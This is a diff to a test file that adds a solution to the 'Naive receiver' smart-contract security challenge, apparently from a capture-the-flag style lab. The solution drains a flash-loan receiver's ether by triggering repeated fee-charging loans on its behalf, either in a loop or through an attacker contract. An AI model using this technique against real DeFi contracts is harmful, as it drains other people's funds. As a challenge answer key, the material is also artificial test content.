@@ -22,6 +22,10 @@ describe('[Challenge] Naive receiver', function () {
       'FlashLoanReceiver',
       deployer
     );
+    const NaiveReceiverAttackerFactory = await ethers.getContractFactory(
+      'NaiveReceiverAttacker',
+      deployer
+    );
 
     this.pool = await LenderPoolFactory.deploy();
     await deployer.sendTransaction({
@@ -45,10 +49,29 @@ describe('[Challenge] Naive receiver', function () {
     expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
       ETHER_IN_RECEIVER
     );
+
+    this.attacker = await NaiveReceiverAttackerFactory.deploy();
   });
 
   it('Exploit', async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    /**
+     * Option 1: Multiple transactions, using only blockchain API, more fees
+     */
+    // const receiverBalance = await ethers.provider.getBalance(
+    //   this.receiver.address
+    // );
+    // const fee = await this.pool.fixedFee();
+    // const times = receiverBalance.div(
+    //   fee
+    // );
+    // for (let index = 0; index < times; index++) {
+    //   await this.pool.flashLoan(this.receiver.address, 1);
+    // }
+
+    /**
+     * Option 2: Single transaction, using an attacker contract, less fees
+     */
+    await this.attacker.attack(this.pool.address, this.receiver.address);
   });
 
   after(async function () {
